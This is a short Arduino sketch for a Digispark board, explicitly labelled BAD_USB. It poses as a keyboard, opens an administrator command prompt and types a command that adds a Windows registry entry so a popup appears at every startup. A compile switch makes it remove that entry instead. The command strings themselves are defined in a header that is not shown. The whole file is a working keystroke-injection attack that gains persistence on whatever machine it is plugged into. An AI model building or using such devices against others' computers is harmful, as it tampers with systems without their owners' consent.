#include <DigiKeyboard.h>
#include <defines.h>

//! Define comment the following line to restore the register value
#define BAD_USB
//!


void setup()
{
    DigiKeyboard.sendKeyStroke(0);
    delay(500);

    LED_ENABLE();
    LED_ON();

    RUN_CMD_AS_ADMIN(1000, 2000);
    delay(5000);

#ifdef BAD_USB
    DigiKeyboard.println(CMD_ADD_REG_ENTRY_FOR_POPUP_ON_STARTUP);
#else
    DigiKeyboard.println(CMD_CLEAR_REG_ENTRY_FOR_POPUP_ON_STARTUP);
#endif

    delay(100);
    DigiKeyboard.println("exit");

    LED_OFF();
    LED_DISABLE();
}

void loop() {}
